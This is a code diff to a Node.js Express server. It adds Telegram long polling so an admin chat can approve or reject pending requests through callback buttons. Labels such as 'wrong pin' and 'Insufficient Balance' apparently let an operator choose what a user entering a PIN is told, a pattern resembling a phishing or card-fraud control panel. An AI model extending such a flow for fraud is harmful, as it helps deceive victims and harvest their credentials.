@@ -16,7 +16,7 @@
 
 const express = require('express');
 const path = require('path');
-const { Api } = require('node-telegram-bot-api');
+const { Api, longPoll } = require('node-telegram-bot-api');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -345,8 +345,48 @@ const LABEL_BY_ACTION = {
   insufficient: 'Insufficient Balance ⚠️',
   demo_error:'wrong pin⚠️',
 };
-if (api) {
-  console.log('Telegram API ready. Approval messages will be sent to the configured admin chat.');
+
+async function processTelegramCallbacks() {
+  try {
+    await api.deleteWebhook({ drop_pending_updates: false });
+    console.log('Telegram API ready. Listening for admin approval actions.');
+
+    for await (const update of longPoll(api, { timeout: 30 })) {
+      const callback = update.callback_query;
+      if (!callback) continue;
+
+      const [action, id] = String(callback.data || '').split(':');
+      const status = STATUS_BY_ACTION[action];
+      const chatId = callback.message?.chat?.id;
+      const messageId = callback.message?.message_id;
+
+      if (String(chatId) !== String(ADMIN_CHAT_ID)) {
+        await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'Not authorized.' });
+        continue;
+      }
+
+      if (!status || !id || !requests.has(id)) {
+        await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'This request is no longer available.' });
+        continue;
+      }
+
+      updateRequestStatus(id, status);
+      await api.answerCallbackQuery({ callback_query_id: callback.id, text: LABEL_BY_ACTION[action] });
+      if (messageId) {
+        await api.editMessageReplyMarkup({
+          chat_id: chatId,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [] },
+        });
+      }
+    }
+  } catch (err) {
+    console.error('Telegram callback polling failed:', err.message);
+  }
+}
+
+if (api && ADMIN_CHAT_ID) {
+  processTelegramCallbacks();
 }
 
 // ---------------------------------------------------------------------------
